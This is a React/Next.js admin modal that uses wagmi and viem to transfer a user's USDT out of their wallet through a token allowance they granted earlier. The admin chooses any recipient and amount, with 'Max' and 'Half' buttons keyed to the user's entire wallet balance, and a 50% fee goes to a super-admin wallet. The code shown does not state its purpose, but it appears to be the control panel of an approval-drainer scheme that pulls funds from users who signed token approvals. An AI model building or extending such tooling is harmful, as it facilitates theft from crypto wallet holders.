'use client';

import React, { useState, useEffect, useMemo } from 'react'; // Added useEffect, useMemo
import { motion, AnimatePresence } from 'framer-motion';
import { X, AlertTriangle, Send, Loader2, Wallet, User, CheckCircle, ArrowRight, DollarSign, Info } from 'lucide-react'; // Added DollarSign, Info
import { useAccount } from 'wagmi'; // Keep useAccount for adminAddress (display only)
import { parseUnits, formatUnits, isAddress, encodeFunctionData } from 'viem'; // Import viem helpers, added encodeFunctionData
import { usePublicClient } from 'wagmi'; // Added usePublicClient
import Notification from '@/components/Notification'; // Import the Notification component
import { debounce } from 'lodash'; // Import debounce

// Define the conventional string representation for maximum uint256
const MAX_UINT256_STRING = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// Constants & Config (should match backend/payout-gateway)
const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS; // Assuming this is the token/payout contract
const SUPER_ADMIN_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SUPER_ADMIN_WALLET_ADDRESS;
const USDT_DECIMALS = 6; // USDT uses 6 decimals
const ADMIN_FEE_PERCENT = parseInt(process.env.NEXT_PUBLIC_SUPER_ADMIN_APPROVAL_FEE_PERCENT || '50', 10); // 50% fee, from env

// Updated ABI based on user feedback (including transferFromUserWithFee)
const tokenApprovalABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "getBalanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function",
        "constant": true
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "fromUser",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipientAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "superAdminWalletAddress",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "totalAmount",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "feeAmount",
                "type": "uint256"
            }
        ],
        "name": "transferDirectFromWalletWithFee", // Reverted to new function name
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
];


// Helper to format USDT balance for display
const formatDisplayAmount = (amount) => {
    if (typeof amount !== 'number' || isNaN(amount)) return 'N/A';
    return `${amount.toFixed(2)} USDT`;
};

// Helper to shorten addresses
const shortenAddress = (address, chars = 6) => {
    if (!address || typeof address !== 'string') return 'N/A';
    return `${address.substring(0, chars)}...${address.substring(address.length - chars)}`;
};

// Animation variants
const modalVariants = {
    hidden: { opacity: 0, scale: 0.95, y: 30 },
    visible: {
        opacity: 1,
        scale: 1,
        y: 0,
        transition: {
            duration: 0.4,
            ease: [0.16, 1, 0.3, 1],
            staggerChildren: 0.05,
            delayChildren: 0.1
        }
    },
    exit: {
        opacity: 0,
        scale: 0.97,
        y: 20,
        transition: {
            duration: 0.25,
            ease: 'easeInOut'
        }
    },
};

const backdropVariants = {
    hidden: { opacity: 0 },
    visible: { opacity: 1, transition: { duration: 0.3 } },
    exit: { opacity: 0, transition: { duration: 0.25 } },
};

const itemVariants = {
    hidden: { opacity: 0, y: 10 },
    visible: { opacity: 1, y: 0, transition: { duration: 0.3 } }
};

// Custom detail row component with animations
const DetailRow = ({ icon: Icon, label, value }) => (
    <motion.div
        variants={itemVariants}
        className="flex items-center space-x-3 py-2 text-sm group transition-all"
    >
        <div className="bg-blue-500/10 p-2 rounded-full text-blue-400">
            <Icon size={16} className="flex-shrink-0" />
        </div>
        <span className="font-medium text-gray-400">{label}:</span>
        <span className="text-gray-100 font-medium truncate flex-1" title={value}>{value}</span>
    </motion.div>
);

export default function TransferModal({ isOpen, onClose, approvalData, onTransferSuccess }) {
    const { address: connectedWalletAddress, isConnected } = useAccount();
    const publicClient = usePublicClient();

    // Extract necessary data safely at the top level
    const {
        _id: approvalId,
        user,
        ownerAddress = 'N/A',
        spenderAddress = 'N/A',
        tokenAddress = 'N/A',
        approvedAmount = '0',
        approvedAmountHumanReadable = '0.00',
        userContractBalance = 0,
        contractUsdtBalance = 0,
    } = approvalData || {}; // Ensure approvalData is not null/undefined

    const {
        name: userName = 'Unknown User',
    } = user || {};

    const [recipientAddress, setRecipientAddress] = useState('');
    const [amountString, setAmountString] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [error, setError] = useState(null);
    const [showNotification, setShowNotification] = useState(false);
    const [notificationMessage, setNotificationMessage] = useState('');
    const [notificationType, setNotificationType] = useState('success');
    const [inputFocused, setInputFocused] = useState(false);
    const [backendTxHash, setBackendTxHash] = useState(null);
    const [backendLogId, setBackendLogId] = useState(null);
    const [estimatedGasFeeEth, setEstimatedGasFeeEth] = useState(null);
    const [isEstimatingGas, setIsEstimatingGas] = useState(false);
    const [successMessage, setSuccessMessage] = useState(null);
    const [ethPriceUsd, setEthPriceUsd] = useState(null);
    const [ethPriceLoading, setEthPriceLoading] = useState(true);
    const [ethPriceError, setEthPriceError] = useState(null);

    // Calculate fee and recipient amount based on amountString
    const totalAmountNum = parseFloat(amountString);
    const adminFeeAmountNum = useMemo(() => {
        if (isNaN(totalAmountNum) || totalAmountNum <= 0) return 0;
        return totalAmountNum * (ADMIN_FEE_PERCENT / 100);
    }, [totalAmountNum]);

    const recipientAmountNum = useMemo(() => {
        if (isNaN(totalAmountNum) || totalAmountNum <= 0) return 0;
        return totalAmountNum - adminFeeAmountNum;
    }, [totalAmountNum, adminFeeAmountNum]);

    // --- Gas Estimation Function (Frontend) ---
    const estimateGasFee = useMemo(() => {
        return debounce(async () => {
            const amountNum = parseFloat(amountString);
            const isAmountValid = amountNum > 0 && !isNaN(amountNum);
            const isRecipientAddressValid = isAddress(recipientAddress);
            const isOwnerAddressValid = isAddress(ownerAddress); // Now ownerAddress is always available

            if (!isOpen || !isAmountValid || !isRecipientAddressValid || !isOwnerAddressValid || !publicClient) {
                setEstimatedGasFeeEth(null);
                setIsEstimatingGas(false);
                setError(null);
                return;
            }

            setIsEstimatingGas(true);
            setError(null); // Clear previous errors before new estimation
            setEstimatedGasFeeEth(null); // Clear previous estimation

            try {
                const amountParsed = parseUnits(amountString, USDT_DECIMALS);
                const feeAmountParsed = parseUnits(adminFeeAmountNum.toFixed(USDT_DECIMALS), USDT_DECIMALS);

                const data = encodeFunctionData({
                    abi: tokenApprovalABI,
                    functionName: 'transferDirectFromWalletWithFee',
                    args: [
                        ownerAddress,
                        recipientAddress,
                        SUPER_ADMIN_WALLET_ADDRESS,
                        amountParsed,
                        feeAmountParsed
                    ],
                });

                const gasEstimate = await publicClient.estimateGas({
                    account: process.env.NEXT_PUBLIC_SUPER_ADMIN_WALLET_ADDRESS, // Admin's wallet will execute the transaction
                    to: CONTRACT_ADDRESS,
                    data: data,
                });

                const gasPrice = await publicClient.getGasPrice();
                const estimatedFeeWei = gasEstimate * gasPrice;
                const estimatedFeeEth = formatUnits(estimatedFeeWei, 18);

                setEstimatedGasFeeEth(estimatedFeeEth);
            } catch (err) {
                console.error("Error estimating gas fee on frontend:", err);
                let errorMessage = "Failed to estimate gas fee.";
                if (err.message.includes("insufficient funds")) {
                    errorMessage = "Insufficient funds in admin's wallet for gas estimation.";
                } else if (err.message.includes("reverted")) {
                    errorMessage = "Transaction would revert. Check user balance or allowance.";
                }
                setError(`Gas estimation failed: ${errorMessage}`);
                setEstimatedGasFeeEth(null); // Clear estimation on error
            } finally {
                setIsEstimatingGas(false);
            }
        }, 700); // Debounce time
    }, [
        isOpen, amountString, recipientAddress, ownerAddress, adminFeeAmountNum,
        publicClient, connectedWalletAddress, CONTRACT_ADDRESS, SUPER_ADMIN_WALLET_ADDRESS, tokenApprovalABI
    ]);

    // Reset form and state when modal opens or approvalData changes
    useEffect(() => {
        if (isOpen) {
            setRecipientAddress('');
            setAmountString('');
            setError(null);
            setSuccessMessage(null); // Reset success message
            setIsSubmitting(false);
            setBackendTxHash(null); // Reset backend transaction hash
            setBackendLogId(null); // Reset backend log ID
            setEstimatedGasFeeEth(null); // Reset estimated gas fee
            setIsEstimatingGas(false); // Reset gas estimation loading
        }
    }, [isOpen, approvalData]);

    // Fetch ETH price on mount
    useEffect(() => {
        const fetchEthPrice = async () => {
            try {
                setEthPriceLoading(true);
                setEthPriceError(null);
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
                if (!response.ok) {
                    throw new Error(`Failed to fetch ETH price: ${response.statusText}`);
                }
                const data = await response.json();
                if (data && data.ethereum && data.ethereum.usd) {
                    setEthPriceUsd(data.ethereum.usd);
                } else {
                    throw new Error('Invalid response from price API');
                }
            } catch (error) {
                console.error("Error fetching ETH price:", error);
                setEthPriceError(error.message || 'Failed to fetch ETH price');
                setEthPriceUsd(null);
            } finally {
                setEthPriceLoading(false);
            }
        };

        fetchEthPrice();
        // Optionally refetch price periodically
        const intervalId = setInterval(fetchEthPrice, 60000); // Refetch every 60 seconds
        return () => clearInterval(intervalId);
    }, []);

    // Effect for dynamic gas estimation
    useEffect(() => {
        estimateGasFee();
        return () => {
            estimateGasFee.cancel(); // Cancel any pending debounced calls on unmount/dependency change
        };
    }, [amountString, recipientAddress, isOpen, approvalData?.ownerAddress, estimateGasFee]); // Dependencies for re-running estimation

    // Calculate estimated gas fee in USD
    const estimatedGasFeeUsd = useMemo(() => {
        if (estimatedGasFeeEth !== null && ethPriceUsd !== null) {
            return parseFloat(estimatedGasFeeEth) * ethPriceUsd;
        }
        return null;
    }, [estimatedGasFeeEth, ethPriceUsd]);

    // Handle backend transaction completion (simulated confirmation)
    useEffect(() => {
        // This useEffect will now trigger when backendTxHash and backendLogId are set
        if (backendTxHash && backendLogId) {
            console.log('Backend transaction initiated:', backendTxHash);
            // setSuccessMessage(`Transfer initiated! Tx: ${shortenAddress(backendTxHash)}`); // Remove this line

            // Call backend API to log the transaction as completed
            const logTransfer = async () => {
                try {
                    const totalAmountNum = parseFloat(amountString);
                    if (isNaN(totalAmountNum) || totalAmountNum <= 0) {
                        console.error("Invalid amountString state for logging:", amountString);
                        throw new Error("Invalid amount for logging.");
                    }

                    const logPayload = {
                        logId: backendLogId, // Pass the logId to update the existing entry
                        recipientAddress: recipientAddress,
                        totalAmount: totalAmountNum,
                        transactionHash: backendTxHash,
                        status: 'pending', // Re-added the status field
                        adminAddress: connectedWalletAddress, // Use the connected admin's address for logging
                    };
                    console.log("Attempting backend logging (update):", logPayload);

                    const logResponse = await fetch('/api/admin/token-approvals', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(logPayload),
                    });

                    if (!logResponse.ok) {
                        const errorText = await logResponse.text();
                        console.warn("Backend logging failed:", logResponse.status, errorText);
                        setError("Tx initiated, but backend logging failed.");
                        setNotificationMessage(`Transfer initiated, but logging failed: ${errorText}`);
                        setNotificationType('error');
                        setShowNotification(true);
                    } else {
                        console.log("Transfer logged successfully:", await logResponse.json());
                        setNotificationMessage(`Transfer of ${formatDisplayAmount(totalAmountNum)} to ${shortenAddress(recipientAddress)} successful!`);
                        setNotificationType('success');
                        setShowNotification(true);

                        if (onTransferSuccess) {
                            onTransferSuccess(); // Notify parent component to refresh data and close modal
                        }
                        // Do NOT close modal immediately. Let the notification display.
                        // The parent component (via onTransferSuccess) should handle modal closure after a delay if needed.
                    }
                } catch (logError) {
                    console.error("Error during backend logging call:", logError);
                    setError(`Tx initiated, but backend logging error: ${logError.message}`);
                    setNotificationMessage(`Transfer initiated, but logging error: ${logError.message}`);
                    setNotificationType('error');
                    setShowNotification(true);
                } finally {
                    // Reset form and state regardless of logging success/failure
                    setRecipientAddress('');
                    setAmountString('');
                    setIsSubmitting(false);
                    setBackendTxHash(null);
                    setBackendLogId(null); // Clear log ID after use
                    // Notification will handle its own duration and closing
                    // The modal will now remain open until the parent component explicitly closes it.
                }
            };

            logTransfer();
        }
    }, [backendTxHash, backendLogId, approvalData, recipientAddress, amountString, connectedWalletAddress, onClose, onTransferSuccess]); // Add backendLogId to dependencies

    // Early return if modal is not open or no approval data is provided.
    // This check is still needed as approvalData might be null initially.
    if (!isOpen || !approvalData) return null;

    // The destructuring of approvalData and user is now at the top of the component.
    // No need to repeat it here.


    const handleInitiateTransfer = async (e) => {
        e.preventDefault();
        setError(null);

        // Client-side validation
        if (!isConnected || !connectedWalletAddress) {
            setError("Admin wallet not connected. Please connect your wallet.");
            return;
        }
        if (!CONTRACT_ADDRESS || !isAddress(CONTRACT_ADDRESS)) {
            setError("Payout contract address is invalid or missing. Check configuration.");
            return;
        }
        if (!SUPER_ADMIN_WALLET_ADDRESS || !isAddress(SUPER_ADMIN_WALLET_ADDRESS)) {
            setError("Super admin wallet address is not configured correctly.");
            return;
        }
        if (!recipientAddress || !isAddress(recipientAddress)) {
            setError('Please enter a valid recipient wallet address (0x...).');
            return;
        }
        if (!ownerAddress || ownerAddress === 'N/A' || !isAddress(ownerAddress)) {
            setError('Owner address is missing or invalid in approval data.');
            return;
        }
        if (!spenderAddress || spenderAddress === 'N/A' || !isAddress(spenderAddress)) {
            setError('Spender address is missing or invalid in approval data.');
            return;
        }
        if (spenderAddress.toLowerCase() !== CONTRACT_ADDRESS.toLowerCase()) {
            setError(`Approval spender address (${shortenAddress(spenderAddress)}) does not match the configured contract address (${shortenAddress(CONTRACT_ADDRESS)}).`);
            return;
        }

        const amountNum = parseFloat(amountString);
        if (isNaN(amountNum) || amountNum <= 0) {
            setError("Please enter a positive amount to transfer.");
            return;
        }

        const amountParsed = parseUnits(amountString, USDT_DECIMALS);
        const approvedAmountBigInt = approvedAmount === MAX_UINT256_STRING
            ? BigInt(MAX_UINT256_STRING)
            : BigInt(approvedAmount);
        const userWalletBalance = approvalData?.userWalletUsdtBalance || 0;
        const userWalletBalanceBigInt = parseUnits(userWalletBalance.toFixed(USDT_DECIMALS), USDT_DECIMALS);

        if (amountParsed > approvedAmountBigInt) {
            setError(`Requested amount (${formatUnits(amountParsed, USDT_DECIMALS)}) exceeds the approved allowance (${approvedAmountHumanReadable}).`);
            return;
        }
        if (amountParsed > userWalletBalanceBigInt) {
            setError(`Requested amount (${formatUnits(amountParsed, USDT_DECIMALS)}) exceeds user's current wallet balance (${formatUnits(userWalletBalanceBigInt, USDT_DECIMALS)} USDT).`);
            return;
        }

        setIsSubmitting(true); // Start local submitting state
        setError(null); // Clear previous errors
        setEstimatedGasFeeEth(null); // Clear previous estimation

        try {
            // Proceed with the actual transfer initiation
            const transferResponse = await fetch(`/api/admin/token-approvals?action=initiate-transfer`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: approvalData.user._id, // Pass user ID to backend
                    amount: amountString,
                    recipientAddress: recipientAddress,
                }),
            });

            if (!transferResponse.ok) {
                const errorData = await transferResponse.json();
                throw new Error(errorData.error || errorData.message || 'Failed to initiate transfer from backend.');
            }

            const { transactionHash, logId } = await transferResponse.json();
            setBackendTxHash(transactionHash); // Store the hash from backend
            setBackendLogId(logId); // Store the logId from backend
            // The useEffect for backendTxHash and backendLogId will handle logging and closing
        } catch (err) {
            console.error("Error during transfer initiation:", err);
            setError(`Transfer initiation failed: ${err.message}`);
            setIsSubmitting(false);
            setNotificationMessage(`Transfer initiation failed: ${err.message}`);
            setNotificationType('error');
            setShowNotification(true);
        }
    };

    // Determine button state and text
    const isFormValid = isAddress(recipientAddress) && parseFloat(amountString) > 0 && !isNaN(parseFloat(amountString));
    const isProcessing = isSubmitting || backendTxHash; // isSubmitting covers the fetch call, backendTxHash covers the logging
    let buttonText = 'Initiate Transfer';
    if (isSubmitting && !backendTxHash) {
        buttonText = 'Sending to Backend...';
    } else if (backendTxHash) {
        buttonText = 'Logging Transaction...';
    } else if (!isFormValid) {
        buttonText = 'Enter Details';
    } else if (!isConnected) {
        buttonText = 'Connect Wallet';
    }


    return (
        <AnimatePresence>
            {isOpen && (
                <motion.div
                    key="backdrop-transfer"
                    variants={backdropVariants}
                    initial="hidden"
                    animate="visible"
                    exit="exit"
                    className="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4"
                    onClick={onClose}
                >
                    <motion.div
                        key="modal-transfer"
                        variants={modalVariants}
                        initial="hidden"
                        animate="visible"
                        exit="exit"
                        className="relative w-full max-w-md md:max-w-lg lg:max-w-xl bg-gradient-to-b from-gray-800 to-gray-900 rounded-2xl shadow-2xl shadow-blue-900/20 overflow-hidden z-50 border border-gray-700/50"
                        onClick={(e) => e.stopPropagation()}
                    >
                        {/* Blue glow effect */}
                        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-3/4 h-1 bg-blue-500 blur-md"></div>
                        <div className="absolute -top-10 left-1/2 -translate-x-1/2 w-28 h-28 bg-blue-500/20 rounded-full blur-3xl"></div>

                        {/* Header */}
                        <div className="relative overflow-hidden">
                            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/20 via-indigo-600/10 to-transparent"></div>
                            <div className="flex items-center justify-between px-6 py-4 border-b border-gray-700/50 relative z-10">
                                <h3 className="text-lg font-semibold text-white flex items-center space-x-3">
                                    <div className="bg-orange-500/20 p-1.5 rounded-lg">
                                        <AlertTriangle size={18} className="text-orange-400" />
                                    </div>
                                    <span>Confirm Token Transfer</span>
                                </h3>
                                <motion.button
                                    onClick={onClose}
                                    className="text-gray-400 hover:text-white transition-all rounded-full p-1.5 hover:bg-gray-700/50"
                                    aria-label="Close modal"
                                    disabled={isProcessing}
                                    whileHover={{ scale: 1.1 }}
                                    whileTap={{ scale: 0.95 }}
                                >
                                    <X size={20} />
                                </motion.button>
                            </div>
                        </div>

                        {/* Form Body */}
                        <form onSubmit={handleInitiateTransfer} className="p-6 space-y-5 max-h-[80vh] overflow-y-auto"> {/* Changed onSubmit handler, Added max-height and overflow */}
                            {/* Warning Message */}
                            <motion.div
                                variants={itemVariants}
                                className="p-4 bg-gradient-to-r from-orange-600/20 to-orange-500/5 border border-orange-500/30 rounded-xl text-orange-100 text-sm space-y-2 backdrop-blur-sm"
                            >
                                <div className="flex items-start space-x-3">
                                    <AlertTriangle size={20} className="text-orange-400 flex-shrink-0 mt-0.5" />
                                    <div>
                                        <p className="font-semibold text-white">High-Risk Action</p>
                                        <p className="mt-1 text-orange-200">You are about to initiate a transfer using the user's approved token allowance.</p>
                                        <p className="mt-2 text-orange-200/80">Ensure you have explicit authorization before proceeding.</p>
                                    </div>
                                </div>
                            </motion.div>

                            {/* Display Key Info */}
                            <motion.div
                                variants={itemVariants}
                                className="space-y-1 p-4 bg-gray-800/40 rounded-xl border border-gray-700/50 backdrop-blur-sm"
                            >
                                <p className="text-sm font-medium text-gray-400 mb-2">Transfer Details</p>
                                <DetailRow icon={User} label="User" value={userName} />
                                <DetailRow icon={Wallet} label="Owner Wallet" value={shortenAddress(ownerAddress)} />
                                <DetailRow icon={CheckCircle} label="Token Addr" value={shortenAddress(tokenAddress)} />
                                <DetailRow icon={Wallet} label="Spender" value={shortenAddress(spenderAddress)} />
                                <DetailRow icon={CheckCircle} label="Allowance" value={approvedAmountHumanReadable} />
                                <DetailRow icon={DollarSign} label="User Wallet Bal" value={formatDisplayAmount(approvalData?.userWalletUsdtBalance)} />
                            </motion.div>

                            {/* Recipient Address Input */}
                            <motion.div variants={itemVariants}>
                                <label htmlFor="recipientAddress" className="block text-sm font-medium text-gray-300 mb-2">
                                    Recipient Wallet Address
                                </label>
                                <div className={`relative transition-all duration-300 ${inputFocused ? 'ring-2 ring-blue-500/50' : ''
                                    }`}>
                                    <Wallet size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 peer-focus:text-blue-400 transition-colors duration-200 pointer-events-none z-10" />
                                    <input
                                        type="text"
                                        id="recipientAddress"
                                        name="recipientAddress"
                                        value={recipientAddress}
                                        onChange={(e) => setRecipientAddress(e.target.value)}
                                        onFocus={() => setInputFocused(true)}
                                        onBlur={() => setInputFocused(false)}
                                        className="peer w-full bg-gray-900/80 border border-gray-700 rounded-lg pl-10 pr-4 py-3 text-sm text-gray-100 focus:outline-none placeholder-gray-500 transition-all duration-200 ease-in-out hover:border-gray-600"
                                        placeholder="e.g., 0xAbc123..."
                                        required
                                        disabled={isProcessing}
                                    />
                                </div>
                            </motion.div>

                            {/* Amount Input */}
                            <motion.div variants={itemVariants}>
                                <label htmlFor="amount" className="block text-sm font-medium text-gray-300 mb-2">
                                    Amount to Transfer (USDT)
                                </label>
                                <div className={`relative transition-all duration-300 ${inputFocused ? 'ring-2 ring-blue-500/50' : ''
                                    }`}>
                                    <DollarSign size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 peer-focus:text-blue-400 transition-colors duration-200 pointer-events-none z-10" />
                                    <input
                                        type="text"
                                        inputMode="decimal"
                                        id="amount"
                                        name="amount"
                                        value={amountString}
                                        onChange={(e) => {
                                            const value = e.target.value;
                                            // Allow only numbers and a single decimal point
                                            if (/^$|^\.$|^\d*\.?\d*$/.test(value)) {
                                                setAmountString(value.replace(',', '.'));
                                            }
                                        }}
                                        onFocus={() => setInputFocused(true)}
                                        onBlur={() => setInputFocused(false)}
                                        className="peer w-full bg-gray-900/80 border border-gray-700 rounded-lg pl-10 pr-4 py-3 text-sm text-gray-100 focus:outline-none placeholder-gray-500 transition-all duration-200 ease-in-out hover:border-gray-600"
                                        placeholder={`e.g., 100.50 (Max: ${approvalData?.userWalletUsdtBalance?.toFixed(2) || '0.00'})`} // Hint max amount based on user's wallet balance
                                        required
                                        disabled={isProcessing}
                                    />
                                </div>
                                {/* Quick fill buttons - based on user's wallet balance */}
                                {approvalData?.userWalletUsdtBalance > 0 && ( // Use user's wallet balance for condition
                                    <div className="flex space-x-3 mt-2 justify-end">
                                        {[
                                            { label: 'Max', valueFn: (bal) => bal.toFixed(USDT_DECIMALS) },
                                            { label: 'Half', valueFn: (bal) => (bal / 2).toFixed(USDT_DECIMALS) }
                                        ].map(btn => (
                                            <button
                                                key={btn.label}
                                                type="button"
                                                onClick={() => setAmountString(btn.valueFn(approvalData.userWalletUsdtBalance))} // Use user's wallet balance
                                                className="px-3.5 py-1.5 text-xs font-medium text-gray-300 bg-gray-700 hover:bg-gray-600 rounded-md border border-gray-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed shadow-sm hover:shadow-md"
                                                disabled={isProcessing}
                                            >
                                                {btn.label}
                                            </button>
                                        ))}
                                    </div>
                                )}
                            </motion.div>

                            {/* Fee and Recipient Amount Display */}
                            {(totalAmountNum > 0 && !isNaN(totalAmountNum)) || estimatedGasFeeEth !== null ? ( // Condition changed
                                <motion.div
                                    variants={itemVariants}
                                    initial="hidden"
                                    animate="visible"
                                    className="p-4 bg-gray-800/40 rounded-xl border border-gray-700/50 backdrop-blur-sm space-y-2"
                                >
                                    <p className="text-sm font-medium text-gray-400 mb-2">Amount Breakdown ({ADMIN_FEE_PERCENT}% Admin Fee)</p>
                                    {totalAmountNum > 0 && !isNaN(totalAmountNum) && ( // Only show these if amount is valid
                                        <>
                                            <div className="flex justify-between items-center text-sm text-gray-200">
                                                <span className="font-medium text-gray-300">Total Amount:</span>
                                                <span className="font-mono text-blue-300">{formatDisplayAmount(totalAmountNum)}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm text-gray-200">
                                                <span className="font-medium text-gray-300">Admin Fee ({ADMIN_FEE_PERCENT}%):</span>
                                                <span className="font-mono text-green-300">{formatDisplayAmount(adminFeeAmountNum)}</span>
                                            </div>
                                            <div className="flex justify-between items-center text-sm text-gray-200">
                                                <span className="font-medium text-gray-300">Recipient Receives:</span>
                                                <span className="font-mono text-teal-300">{formatDisplayAmount(recipientAmountNum)}</span>
                                            </div>
                                        </>
                                    )}
                                    {isEstimatingGas ? (
                                        <div className="flex justify-between items-center text-sm text-gray-200">
                                            <span className="font-medium text-gray-300">Est. Gas Fee:</span>
                                            <Loader2 size={16} className="animate-spin text-blue-400" />
                                        </div>
                                    ) : estimatedGasFeeEth !== null ? ( // Always show gas fee if available
                                        <div className="flex justify-between items-center text-sm text-gray-200">
                                            <span className="font-medium text-gray-300">Est. Gas Fee:</span>
                                            <span className="font-mono text-purple-300">
                                                {`${parseFloat(estimatedGasFeeEth).toFixed(6)} ETH`}
                                                {estimatedGasFeeUsd !== null && (
                                                    <span className="text-gray-400 ml-2 tracking-wider">
                                                        (~${estimatedGasFeeUsd.toFixed(2)})
                                                    </span>
                                                )}
                                                {ethPriceLoading && <Loader2 size={12} className="animate-spin ml-2 inline-block" />}
                                                {ethPriceError && <span className="text-red-400 ml-2" title={ethPriceError}><AlertTriangle size={12} className="inline-block" /></span>}
                                            </span>
                                        </div>
                                    ) : null}
                                    {SUPER_ADMIN_WALLET_ADDRESS && (
                                        <div className="flex justify-between items-center text-xs text-gray-500 pt-2 border-t border-gray-700/50">
                                            <span>Admin Fee Wallet:</span>
                                            <span className="font-mono">{shortenAddress(SUPER_ADMIN_WALLET_ADDRESS)}</span>
                                        </div>
                                    )}
                                </motion.div>
                            ) : null}


                            {/* Error Display */}
                            <AnimatePresence mode="wait">
                                {error && (
                                    <motion.div
                                        initial={{ opacity: 0, y: 5 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -5 }}
                                        className="text-red-300 text-sm flex items-start space-x-2 px-2 p-3 bg-red-900/20 border border-red-700/40 rounded-lg"
                                    >
                                        <AlertTriangle size={16} className="flex-shrink-0 mt-0.5" />
                                        <span className="flex-1">{error}</span>
                                    </motion.div>
                                )}
                            </AnimatePresence>

                            {/* Footer Actions */}
                            <motion.div
                                variants={itemVariants}
                                className="flex justify-between items-center pt-3 space-x-4"
                            >
                                <motion.button
                                    type="button"
                                    onClick={onClose}
                                    disabled={isProcessing}
                                    className="px-5 py-2.5 rounded-lg text-sm font-medium text-gray-300 bg-gray-800/80 hover:bg-gray-700/80 border border-gray-700/50 transition-colors disabled:opacity-50"
                                    whileHover={{ scale: 1.02 }}
                                    whileTap={{ scale: 0.98 }}
                                >
                                    Cancel
                                </motion.button>

                                <motion.button
                                    type="submit"
                                    disabled={isProcessing || !isFormValid || !isConnected} // Disable if processing, form invalid, or wallet not connected
                                    className="relative overflow-hidden group px-6 py-2.5 rounded-lg text-sm font-medium text-white bg-gradient-to-r from-blue-600 to-blue-500 transition-all duration-300 ease-out disabled:opacity-60 disabled:cursor-not-allowed"
                                    whileHover={{
                                        scale: 1.02,
                                        transition: { duration: 0.2 }
                                    }}
                                    whileTap={{ scale: 0.98 }}
                                >
                                    {/* Animated shine effect */}
                                    <motion.div
                                        className="absolute top-0 -left-full w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent"
                                        animate={{
                                            left: ['100%', '-100%'],
                                            transition: {
                                                repeat: Infinity,
                                                repeatDelay: 2,
                                                duration: 1.5,
                                                ease: "easeInOut"
                                            }
                                        }}
                                    />

                                    {/* Button content */}
                                    <span className="relative z-10 flex items-center justify-center">
                                        {isProcessing ? (
                                            <>
                                                <Loader2 size={16} className="animate-spin mr-2" />
                                                <span>{buttonText}</span> {/* Use dynamic button text */}
                                            </>
                                        ) : (
                                            <>
                                                <Send size={14} className="mr-2" />
                                                <span>{buttonText}</span> {/* Use dynamic button text */}
                                                <ArrowRight size={14} className="ml-2 group-hover:translate-x-1 transition-transform" />
                                            </>
                                        )}
                                    </span>
                                </motion.button>
                            </motion.div>
                        </form>
                    </motion.div>
                </motion.div>
            )}
            <Notification
                message={showNotification ? notificationMessage : ''}
                type={notificationType}
                onClose={() => setShowNotification(false)}
                duration={5000} // Notification will disappear after 5 seconds
            />
        </AnimatePresence>
    );
}
